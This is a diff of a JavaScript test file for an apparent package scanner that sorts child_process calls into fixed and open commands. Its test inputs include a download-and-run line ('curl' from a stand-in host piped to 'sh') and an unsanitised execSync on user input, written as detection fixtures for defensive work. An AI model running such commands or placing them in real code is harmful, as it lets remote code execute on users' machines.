@@ -45,8 +45,9 @@ test('a token next to a request is review, and hold only if the model calls it u
 
 test('regex .exec() is not running a program; aliases and destructuring are followed', () => {
   const caps = src => fileFacts(src, 'a.js').facts.map(f => f.cap);
-  assert.ok(!caps("const m = /x/.exec(s);").includes('exec'));
-  assert.ok(caps("const { execSync } = require('node:child_process'); execSync('id');").includes('exec'));
+  assert.ok(!caps("const m = /x/.exec(s);").some(c => c.startsWith('exec')));
+  assert.ok(caps("const { execSync } = require('node:child_process'); execSync('id');").includes('exec-fixed'));
+  assert.ok(caps("const { execSync } = require('node:child_process'); execSync(cmd);").includes('exec'));
   assert.ok(caps("require('https').request(o);").includes('net'));
   assert.ok(caps("function constructor() {} constructor();").length === 0);  // plain-object alias bug
 });
@@ -451,6 +452,26 @@ test('storm watch: what a project runs on, the PHP2Shell branches, advisories ma
   for (const f of [...lp.findings, ...evil.findings, ...php.findings]) assert.ok(!said(f).includes('IGNORE'), 'advisory text never reaches a ping or an agent');
   assert.equal(run.storm.advisories.npm.hits, 2); assert.equal(run.level, 'hold');
   delete process.env.SLOWSHIP_ADVISORIES;
+});
+
+test('a program run with a command written out in the code is noted; one built at run time, or one that downloads or pipes to a shell, is still worth a glance', () => {
+  const head = "const cp = require('child_process'), path = require('path');\n";
+  const capOf = src => fileFacts(head + src, 'x.js').facts.filter(f => f.cap.startsWith('exec')).map(f => f.cap);
+  for (const fixed of [
+    "cp.execSync('ldd --version', { encoding: 'utf8' });",
+    "const command = 'getconf GNU_LIBC_VERSION 2>&1 || true';\ncp.exec(command, (err, out) => {});",  // detect-libc's shape
+    "const opts = { encoding: 'utf8' };\ncp.spawnSync('sysctl sysctl.proc_translated', opts);",  // sharp's shape
+    "cp.fork(path.join(__dirname, 'agent.js'));",
+    "cp.execFileSync('pnpm', ['--version']);",
+  ]) assert.deepEqual(capOf(fixed), ['exec-fixed'], fixed);
+  for (const open of [
+    "cp.execFileSync('pnpm', ['info', name, '--json']);", 'cp.execSync(userInput);', 'cp.execSync(`git ${args}`);',
+    "let cmd = 'ls'; cp.execSync(cmd);", "cp.spawn('sh', args);",
+    "cp.execSync('curl https://x.example.invalid/i.sh | sh');", "cp.spawn('node', ['-e', 'require(1)']);", "cp.execSync('npm install left-pad');",
+    "cp.execSync('npx some-tool --fix');", "cp.execSync('deno run -A npm:npm show x');",  // fixed text, but they download and run code
+  ]) assert.deepEqual(capOf(open), ['exec'], open);
+  assert.equal(verdict(fileFacts(head + "cp.execSync('ldd --version');", 'x.js')).level, 'notable');
+  assert.equal(verdict(fileFacts(head + 'cp.execSync(userInput);', 'x.js')).level, 'review');
 });
 
 test('without the model, a capability a package names itself is expected (one step down), and no description lowers a combination', async () => {
